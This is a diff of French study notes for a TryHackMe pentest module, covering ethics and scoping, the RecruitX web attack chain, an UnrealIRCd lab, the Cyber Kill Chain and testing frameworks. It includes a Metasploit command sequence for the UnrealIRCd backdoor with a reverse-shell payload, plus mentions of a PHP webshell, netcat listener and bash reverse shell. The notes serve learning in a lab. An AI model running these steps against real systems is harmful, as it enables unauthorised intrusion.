@@ -1,105 +1,82 @@
-# Module 1 — Test d'intrusion guidé : Web / Penetration Testing Foundations
+# Module 1: Fondements des tests d'intrusion ( Penetration Testing Foundations )
 
-## Objectif du module
-
-S'initier à une méthodologie complète de test d'intrusion web, depuis la reconnaissance jusqu'à l'exploitation de failles logiques et applicatives courantes, sur une machine de lab TryHackMe.
-
->  Toutes les commandes ci-dessous ont été exécutées sur une machine de lab TryHackMe, avec autorisation explicite dans ce cadre. `<TARGET_IP>` remplace l'adresse IP réelle du lab.
+Ce module pose les bases méthodologiques du métier de pentester : comprendre le cadre légal et éthique d'un test d'intrusion, les phases d'une mission réelle, les frameworks de référence, et mettre tout ça en pratique sur deux exercices guidés (Web puis Infrastructure).
 
 ---
 
-## 1. Reconnaissance réseau — Nmap
+## 🕵️ Plongez dans le test d'intrusion
 
-```
-nmap -sV -sT -p- <TARGET_IP>
-```
+Les bases théoriques : qu'est-ce qu'un pentest, dans quel cadre légal, et selon quelle méthodologie.
 
-- `-sV` : détection des versions de services (bannières)
-- `-sT` : scan TCP connect (handshake complet, plus fiable que `-sS` sans privilèges root)
-- `-p-` (ou `-p 1-65535`) : scan de tous les ports
+- **Définition** : un pentest est un audit autorisé qui reproduit les techniques d'un attaquant réel pour trouver des failles avant qu'un vrai attaquant ne le fasse.
+- **Éthique et cadre légal** :
+  - **Scoping** : testeur et client s'accordent en amont sur les systèmes, outils et techniques autorisés.
+  - **Hat categories** : White hat (légal, bienveillant), Grey hat (résultat bon mais sans respect strict du cadre), Black hat (criminel).
+  - **Rules of Engagement (ROE)** : document qui encadre la mission — autorisation explicite, périmètre précis (scope), règles (techniques permises/interdites).
+- **Méthodologie en 5 phases** :
+  1. **Information Gathering** : collecte d'infos publiques (OSINT), sans scanner.
+  2. **Enumeration/Scanning** : découverte des services/applications actifs.
+  3. **Exploitation** : exploiter une faille pour obtenir un accès initial.
+  4. **Privilege Escalation** : étendre l'accès (horizontale = autre utilisateur même niveau, verticale = niveau de droits supérieur).
+  5. **Post-exploitation** : pivoter vers d'autres machines, effacer les traces, rédiger le rapport.
+- **Types de test** :
+  - **Black-box** : aucune connaissance interne, le testeur part de zéro comme un attaquant externe.
+  - **Grey-box** : connaissance partielle — approche la plus courante en entreprise.
+  - **White-box** : connaissance complète (code source inclus) — le plus exhaustif mais le plus long.
 
-**Ce que ça m'a appris** : commencer par un scan complet des ports plutôt que de se limiter aux ports "communs" évite de rater un service web sur un port non standard (8080, 8443...).
+## 🌐 Test d'intrusion guidé : Web
 
-## 2. Énumération web — Gobuster
+Scénario "RecruitX" : chaîner plusieurs vulnérabilités web jusqu'à la compromission complète du serveur.
 
-```
-gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
-```
+- **Reconnaissance** : `nmap -sV -sT -p- <TARGET_IP>` pour scanner tous les ports, `curl -I` pour lire les en-têtes HTTP (Apache/PHP), `gobuster dir` pour découvrir `/admin`, `/api`, `/reset.php`, `/uploads`.
+- **IDOR** : copie du cookie de session (`PHPSESSID`) et réutilisation avec `curl -b` pour changer le paramètre `id` et accéder au profil d'autres utilisateurs (y compris l'admin).
+- **Reset de mot de passe faible** : `reset.php` renvoie le token de réinitialisation dans la réponse ; combiné à un espace de tokens faible (6 chiffres) et l'absence de rate limiting, cela permet de réinitialiser le mot de passe admin.
+- **Accès panel admin** : connexion en admin, test d'upload sur `/admin/upload.php` — suppression de l'attribut `accept` côté client (DevTools), `.php` rejeté mais `.phtml` accepté.
+- **RCE** : upload d'un webshell PHP (`shell_exec()` via paramètre `cmd`), exécution de commandes via `curl`, ouverture d'un listener `nc -lvnp 4444`, déclenchement d'un reverse shell bash, lecture du flag.
+- **Attack chain** : IDOR + reset faible + upload non filtré = compromission complète — chaque faille seule semblait mineure, c'est l'enchaînement qui a été critique.
 
-- `dir` : mode de brute-force de répertoires/fichiers
-- `-u` : URL cible
-- `-w` : wordlist utilisée
+## 🖥️ Test d'intrusion guidé : Infrastructure
 
-**Ce que ça m'a appris** : Gobuster permet de découvrir des chemins non référencés (panels d'admin, répertoires d'upload, fichiers de sauvegarde) qui ne sont pas visibles depuis la navigation normale du site.
+Même logique que le module Web, mais côté infrastructure réseau/services.
 
-## 3. Vérification des en-têtes HTTP — curl
+- **Enumeration** : `nmap -sC -sV -T5 -oN scan.txt <TARGET_IP>` — scripts par défaut, détection de versions, scan rapide, sortie sauvegardée pour le rapport.
+- **Identification de la faille** : version UnrealIRCd 3.2.8.1 repérée comme vulnérable (backdoor connue).
+- **Exploitation Metasploit** : 
+`msfconsole
+search unrealircd
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+set RHOSTS <TARGET_IP>
+set payload cmd/unix/reverse
+set LHOST <TON_IP>
+set LPORT <PORT>
+exploit`
+-> shell obtenu directement en tant que `webmaster`, sans identifiants.
+- **Découverte d'identifiants** : mot de passe root trouvé en clair (`find / -name password*`).
+- **Élévation de privilèges** : connexion SSH en root avec le mot de passe trouvé.
+- **Reporting** : rédaction d'un exemple de rapport de vulnérabilité avec recommandations de remédiation.
 
-```
-curl -I http://<TARGET_IP>
-```
 
-- `-I` : récupère uniquement les en-têtes HTTP (pas le corps de la réponse)
+## ⚔️ Cyber Kill Chain
 
-**Ce que ça m'a appris** : les en-têtes révèlent souvent la stack technique (serveur web, framework, cookies de session) sans avoir à charger toute la page — utile pour affiner la recherche de vulnérabilités connues.
+Le modèle Lockheed Martin pour découper une attaque en 7 étapes chronologiques : Reconnaissance → Weaponization → Delivery → Exploitation → Installation → Command & Control → Actions on Objectives.
 
-## 4. Contournement de la réinitialisation de mot de passe
+- **Exercice de classification** : associer des actions concrètes à la bonne étape (ex. *Craft a phishing email* = Weaponization, *Send phishing emails* = Delivery, *Log in with default credentials* = Exploitation, *Add a malicious service* = Installation, *Use HTTPS for communication* = C2, *DNS query* = Reconnaissance, *Data exfiltration* = Actions on Objectives).
+- **Intérêt** : comprendre à quel moment de l'attaque on se situe aide à savoir quoi documenter et comment un défenseur peut couper la chaîne à temps.
 
-**Principe** : certains formulaires de "mot de passe oublié" font confiance à des valeurs contrôlées par le client (identifiant utilisateur dans l'URL, jeton prévisible, ou étape de vérification contournable côté client) plutôt que de valider strictement l'identité côté serveur.
+## 📚 Cadres de tests d'intrusion
 
-**Méthodologie suivie** :
-1. Intercepter la requête de réinitialisation avec Burp Suite.
-2. Identifier quel paramètre détermine le compte ciblé (ex. `user_id`, `email` passé en clair).
-3. Vérifier si ce paramètre peut être modifié pour cibler un autre compte sans que le serveur ne revérifie la propriété du compte.
+Panorama des référentiels méthodologiques utilisés dans l'industrie.
 
-**Point de vigilance côté défense** : toujours valider côté serveur que l'utilisateur authentifié (ou le token envoyé par e-mail) correspond bien au compte ciblé par la réinitialisation.
-
-## 5. IDOR (Insecure Direct Object Reference)
-
-**Principe** : l'application expose une référence directe à un objet (ID de document, de facture, de profil...) dans l'URL ou une requête, sans vérifier que l'utilisateur courant a le droit d'accéder à cet objet précis.
-
-**Méthodologie suivie** :
-1. Repérer un identifiant numérique/séquentiel dans une URL ou un paramètre (ex. `?doc_id=15`).
-2. Modifier cet identifiant (incrémenter, décrémenter) tout en restant connecté avec mon propre compte.
-3. Observer si l'application renvoie les données d'un autre utilisateur.
-
-**Point de vigilance côté défense** : implémenter un contrôle d'autorisation systématique (vérifier que l'objet demandé appartient bien à l'utilisateur authentifié), plutôt que de se reposer sur l'absence de visibilité de l'ID.
-
-## 6. Vol de session via cookie
-
-**Principe** : si le cookie de session n'est pas correctement protégé (pas de flag `HttpOnly`/`Secure`, transmis en clair, ou simplement réutilisable), un attaquant en possession de ce cookie peut usurper la session d'un utilisateur sans connaître son mot de passe.
-
-**Méthodologie suivie** :
-1. Récupérer la valeur du cookie de session (via l'inspecteur du navigateur ou l'historique Burp).
-2. Injecter cette valeur de cookie dans mes propres requêtes vers l'application.
-3. Constater l'accès à la session de l'utilisateur ciblé sans authentification classique.
-
-**Point de vigilance côté défense** : flags `HttpOnly`, `Secure`, `SameSite` sur les cookies, rotation de session après authentification, et transport exclusivement en HTTPS.
-
-## 7. Upload de fichier malveillant → exécution de code à distance
-
-**Principe** : lorsqu'un formulaire d'upload ne valide pas correctement le type de fichier côté serveur (filtrage uniquement côté client, ou sur l'extension sans vérifier le contenu réel), il est possible d'uploader un script interprétable par le serveur (ex. `.phtml`, `.php5`) dans un répertoire accessible publiquement, puis de le déclencher via une requête HTTP pour exécuter des commandes sur le système.
-
-**Méthodologie suivie** (résumé, sans one-liner d'exploitation) :
-1. Identifier un formulaire d'upload et tester les filtres de type de fichier (extension, MIME type, magic bytes).
-2. Uploader un fichier avec une extension exécutable par le serveur web, déguisé pour passer les contrôles côté client.
-3. Localiser le fichier uploadé (souvent via Gobuster, étape 2) et y accéder via le navigateur/curl pour déclencher l'exécution du code qu'il contient.
-4. Utiliser cette exécution de code pour établir une connexion shell inversée (reverse shell) vers une machine d'écoute que je contrôle (`nc -lvnp <PORT>`), afin d'obtenir un accès interactif à la machine cible.
-
-**Point de vigilance côté défense** : valider le contenu réel des fichiers uploadés (pas seulement l'extension), stocker les uploads hors de la racine web ou dans un répertoire sans droit d'exécution, et whitelister strictement les types de fichiers autorisés.
+- **OSSTMM** : approche scientifique et métrique du test de sécurité (réseaux filaires, télécoms, sans-fil).
+- **OWASP WSTG** : référence principale pour les tests d'applications web.
+- **NIST SP 800-115** : guide technique du gouvernement américain pour les tests de sécurité.
+- **PTES** : norme pratique, orientée phases, qui colle au déroulement réel d'une mission.
+- **ISSAF** : méthodologie historique avec un modèle d'évaluation en 9 étapes.
+- **MITRE ATT&CK** : base de connaissances des tactiques/techniques d'attaquants réels — complète les méthodologies plutôt que de les remplacer.
+- **Autres** : WASC Threat Classification, CSA Cloud Controls Matrix, OWASP MASTG (mobile), PCI DSS Pentest Guidelines, CBEST.
 
 ---
 
-## Synthèse
+## 📝 Ce que j'ai retenu
 
-| Faille | Cause racine | Impact |
-|--------|---------------|--------|
-| Reset password bypass | Validation côté client / paramètre de confiance mal vérifié | Prise de contrôle de compte |
-| IDOR | Absence de contrôle d'autorisation sur les objets | Fuite de données d'autres utilisateurs |
-| Vol de session | Cookie mal protégé / rejouable | Usurpation de session |
-| Upload → RCE | Validation insuffisante des fichiers uploadés | Exécution de code à distance |
-
-## À retenir pour la suite
-
-- Toujours combiner recon automatisée (nmap, gobuster) et vérification manuelle (curl, navigateur, Burp).
-- La majorité des failles de ce module reposent sur une **confiance excessive envers les données côté client** (IDs, cookies, type de fichier) : réflexe à chercher systématiquement.
-- Documenter chaque étape comme pour un rapport de pentest réel (reproductibilité, impact, remédiation).
+Ce module m'a fait comprendre qu'un pentest n'est pas une improvisation technique : c'est un processus encadré (ROE, scope), structuré en phases identiques quel que soit le framework choisi, et où **l'enchaînement de failles mineures** (comme dans RecruitX ou UnrealIRCd) peut produire un compromis total. La Cyber Kill Chain et les frameworks (PTES, OWASP, MITRE ATT&CK) donnent un vocabulaire commun pour documenter précisément à quelle étape on se trouve — essentiel pour un rapport de pentest crédible.
